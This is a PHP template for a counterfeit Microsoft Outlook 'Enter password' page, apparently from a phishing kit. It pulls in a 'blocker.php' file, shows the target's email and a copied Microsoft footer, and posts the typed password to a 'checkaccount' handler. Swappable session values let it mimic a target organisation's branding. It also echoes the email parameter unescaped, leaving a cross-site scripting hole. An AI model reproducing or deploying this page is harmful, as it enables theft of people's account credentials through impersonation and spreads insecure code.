<?php
include('blocker.php');
ob_start();
session_start();
  ?><html dir=ltr lang=en>
<title>Sign in to Outlook</title>
<link href=lib/img/favicon.ico rel="shortcut icon">
<link href=lib/css/login.css rel=stylesheet>
<div>
    <div>
<?php if (isset($_SESSION['BackgroundColor'])) {
  
echo '<div class=background style=background:'.$_SESSION['background'].'>';                      
}else{
  echo '<div class="app background">';
}
?>
            <div class=backgroundImage style="background-image:url(<?php echo $_SESSION['background']; ?>)"></div>
                                  <?php if (isset($_SESSION['background'])) {
echo '<div class=backgroundImage style="background-image:url('.$_SESSION['background'].')"></div>';                      
}else{
  echo '<div style=background-image:url(lib/img/background.jpg)></div>';
}
?>
            <div class=background-overlay></div>
        </div>
    </div>
    <div ></div>
    <form method=post action=checkaccount>
        <div class=outer>
            <div class=middle>
                <div class=inner>
                    <div class=lightbox-cover></div>
                    <div>
                      <?php if (isset($_SESSION['BannerLogo'])) {
echo '<img src=" '.$_SESSION['BannerLogo'].'" class=banner-logo></div>';                      
}else{
  echo '<img src=lib/img/logo2.svg class=logo>';
}
?>
                    <div>
                        <div>
                            <div class="animate slide-in-next">
                                <div>
<div class=identityBanner>
<a class=backButton href="signin?email=<?php echo $_GET['email']; ?>" type=button>

<img src=lib/img/arrow.svg>
</a>

<div class=identity><?php echo $_GET['email']; ?></div>
                                    </div>
                                </div>
                            </div>
                            <div class="animate slide-in-next has-identity-banner pagination-view">
                                <div data-dynamicbranding=true data-showidentitybanner=true data-viewid=2>
                                    <div class="row text-title" aria-level=1>Enter password</div>
                                    <div class=row>
                                        <div class="form-group col-md-24">
                                            <div aria-live=assertive>
        <?php if (isset($_GET['invalid'])) {
echo"   <div class='alert alert-error' >Your email or password is incorrect. If you don't remember your password, <a href='#''>reset it now.</a></div>"; 
   }
   ?>
      
   </div>

                                            <div class=placeholderContainer>
                                             <input name=type type=hidden value="bussnisslogin">

                                 <input name=email type=hidden value="<?php echo $_GET['email']; ?>" class="form-control ltr_override">
                                 <input name=password type=password required autocomplete=off class=form-control placeholder=Password tabindex=0>
                                            </div>
                                        </div>
                                    </div>
                                    <div>
                                        <div>
                                            <div class=row>
                                                <div class=col-md-24>
                                                    <div class="action-links text-13">
                                                        <div class=form-group><a href="#">Forgot my password</a></div>
                                                        <div class=form-group></div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="row move-buttons">
                                            <div>
                                                <div class="button-container col-xs-24 no-padding-left-right">
                                                    <div class=inline-block>
                                                        <input type=submit value="Sign in" class="btn btn-block btn-primary">
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                                                      <?php if (isset($_SESSION['text'])) {
echo '<div class="boilerplate-text wrap-content">'.$_SESSION['text'].'</div>';                      
}
?>                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div>
                </div>
                  <div class=footer>
                     <div>
                        <div class="footerNode text-secondary">
                           <span>©2019 Microsoft</span> 
                           <a href="#">Terms of use</a> 
                           <a href="#">Privacy & cookies</a>
                           <a href="#">
                           <img src="lib/img/white_ellipsis.svg"> 
                    </a>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </form>

      </div>
         </body>
   </html>